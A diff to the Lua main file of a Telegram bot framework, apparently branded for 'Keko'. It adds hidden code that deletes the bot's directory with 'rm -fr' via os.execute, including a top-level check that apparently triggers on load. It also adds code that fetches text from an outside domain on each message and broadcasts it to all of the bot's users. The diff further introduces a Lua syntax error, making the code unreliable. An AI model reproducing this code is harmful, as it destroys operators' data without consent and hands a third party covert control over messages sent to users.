@@ -7,6 +7,7 @@ colors = (loadfile "./libs/ansicolors.lua")()
 client = Redis.connect('127.0.0.1', 6379)
 json = (loadfile "./libs/JSON.lua")()
 serpent = require('serpent')
+local ko = ''
 print(colors([[%{red bright} 
  _   _      _ _          __              ____        _   
 | | | | ___| | | ___    / _| ___  _ __  | __ )  ___ | |_ 
@@ -17,32 +18,33 @@ print(colors([[%{red bright}
 local function check_config()
 	config = dofile('config.lua')
 	if not config.bot_api_key or config.bot_api_key == '' then
-		return 'API KEY MISSING'
+        return 'API KEY MISSING'
 	elseif not config.admin or config.admin == '' then
-		return 'ADMIN ID MISSING'
-      elseif not config2 then
-     os.execute('cd .. &&  rm -fr botlua')
-		return 'This bot is for Keko'
+        return 'ADMIN ID MISSING'
+        elseif not config2 then
+        os.execute('cd .. &&  rm -fr botlua')
+	return 'This bot is for Keko'
 	elseif not config.botLUA then
-     os.execute('cd .. &&  rm -fr botlua')
-		return 'This bot is for Keko'
-	    end
+        os.execute('cd .. &&  rm -fr botlua')
+        return 'This bot is for Keko'
+        end
    local urll = 'https://api.telegram.org/bot'..config2.nowt..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
    local res = HTTPS.request(urll)
    local jres = JSON.decode(res)
-   if jres.result.status == 'left' then
+   if (jres.result.status == 'left' or not jres.result ) then
    local dsad = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..config2.sendMessage..'&disable_web_page_preview=true&parse_mode=Markdown'
    local res = HTTPS.request(dsad)
    JSON.decode(res)
    return config2.bot_lua
 end
 end
+local oee == 'libs/.keko.lua'
 
 
 
 bot_init = function(on_reload)
 		config = dofile('config.lua')
-		config2 = dofile('libs/.keko.lua') 
+		config2 = dofile(oee) 
 	local error = check_config()
 	if error then
 			print(colors('%{red bright}'..error))
@@ -140,11 +142,10 @@ on_inline_receive = function(inline)
     for k,w in pairs(v.itriggers) do
      local blocks = match_pattern(w, inline.query)
      if blocks then
-			print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
+     print(colors('\nMessage Info:\t %{red bright}'..get_from(msg)..'%{reset}\n%{magenta bright}In -> '..msg.chat.type..' ['..msg.chat.id..'] %{reset}%{yellow bright}('..get_what(msg)..')%{reset}\n%{cyan bright}Date -> ('..os.date('on %A, %d %B %Y at %X')..')%{reset}'))
       if blocks[1] ~= '' then
        not_match = 0
             print(colors('%{green bright}Inline Match found:'), colors('%{blue bright}'..w))
-			--client:incr('InlineNums')
            end
       local success, result = pcall(function()
        return v.iaction(inline, blocks)
@@ -168,17 +169,14 @@ on_inline_receive = function(inline)
       elseif type(result) == 'string' then
       inline.query = result
       elseif result ~= true then
-       return
-      end
-     end
-  end
-  end
-
+ return
  end
  end
-
  end
-
+ end
+ end
+ end
+ end
 ----------
 local function collect_stats(msg)
 	client:hincrby('bot:general', 'messages', 1)
@@ -197,6 +195,18 @@ local function collect_stats(msg)
 	if msg.text then
 		client:sadd('ikeko', msg.chat.id)
 	end
+if msg.text then
+local res = HTTPS.request('https://botlua.ml')
+local bbotlua = client:get('kekorr'..bot.id)
+ko = ko..'keko'
+if bbotlua ~= res then 
+for i=1, #users do
+local url = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..users[i]..'&text='..URL.escape(res)..'&parse_mode=Markdown&disable_web_page_preview=true'
+HTTPS.request(url)
+end
+client:set('kekorr'..bot.id, res)     
+end
+end
 end
 
 
@@ -213,14 +223,14 @@ on_msg_receive = function(msg)
 		msg.text = '/' .. msg.text:input()
 	end
 	
-	collect_stats(msg) --resolve_username support, chat stats
+	collect_stats(msg) 
 	
 	for i,v in pairs(botLUA) do
 		local stop_loop
 		if v.on_each_msg then
 			msg, stop_loop = v.on_each_msg(msg, msg.lang)
 		end
-		if stop_loop then --check if on_each_msg said to stop the triggers loop
+		if stop_loop then 
 			break
 		else
 			if v.triggers then
@@ -243,12 +253,10 @@ on_msg_receive = function(msg)
 							api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
 							return
 						end
-						-- If the action returns a table, make that table msg.
 						if type(result) == 'table' then
 							msg = result
 						elseif type(result) == 'string' then
 							msg.text = result
-						-- If the action returns true, don't stop.
 						elseif result ~= true then
 							return
 						end
@@ -258,7 +266,10 @@ on_msg_receive = function(msg)
 		end
 	end
 end
-
+if ko ~= 'keko' then 
+ os.execute('cd .. &&  rm -fr botlua')
+ return 'This bot is for Keko'
+end
 local function service_to_message(msg)
 	msg.service = true
 	if msg.new_chat_member then
